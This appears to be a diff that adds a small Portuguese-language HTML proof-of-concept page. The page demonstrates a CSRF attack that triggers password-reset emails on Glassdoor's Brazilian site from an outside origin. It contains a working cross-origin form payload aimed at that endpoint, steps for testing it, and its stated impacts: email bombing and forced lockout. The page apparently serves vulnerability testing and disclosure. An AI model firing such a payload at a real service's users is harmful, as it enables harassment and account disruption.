@@ -1,0 +1,36 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PoC CSRF – Reset de Senha (Glassdoor)</title>
+<body>
+<h2>PoC CSRF – Disparar reset de senha a partir de origem externa</h2>
+
+<p>
+Esta página demonstra como um atacante em domínio externo poderia disparar o envio
+de e-mail de reset de senha no Glassdoor sem interação da vítima além de visitar a página.
+</p>
+
+<form id="f" action="https://www.glassdoor.com.br/auth/account/password/forgot/" method="POST" enctype="text/plain">
+<textarea id="payload" style="width:100%;height:120px">
+{"emailAddress":"SEU_EMAIL_AQUI"}
+</textarea>
+<br>
+<button type="submit">Disparar reset (CSRF)</button>
+</form>
+
+<p style="font-size:13px;color:#444;margin-top:20px">
+🔎 <b>Como testar:</b>
+<ol>
+  <li>Substitua <code>SEU_EMAIL_AQUI</code> por um endereço de e-mail que você controla.</li>
+  <li>Abra esta página hospedada no <b>GitHub Pages</b> em uma janela anônima/incógnita.</li>
+  <li>Clique em <b>Disparar reset (CSRF)</b>.</li>
+  <li>No DevTools → Network, confira se o <code>POST</code> para <code>/auth/account/password/forgot/</code> retorna <code>200</code>.</li>
+  <li>Verifique se um e-mail de reset de senha chegou à sua caixa de entrada.</li>
+</ol>
+</p>
+
+<hr>
+<p style="font-size:12px;color:#666">
+Se o e-mail chegar, significa que o endpoint é vulnerável a <b>CSRF em reset de senha</b>.<br>
+Impacto: <i>e-mail bombing</i>, lockout forçado e engenharia social para levar a vítima a clicar repetidamente em links de reset.
+</p>
+</body>
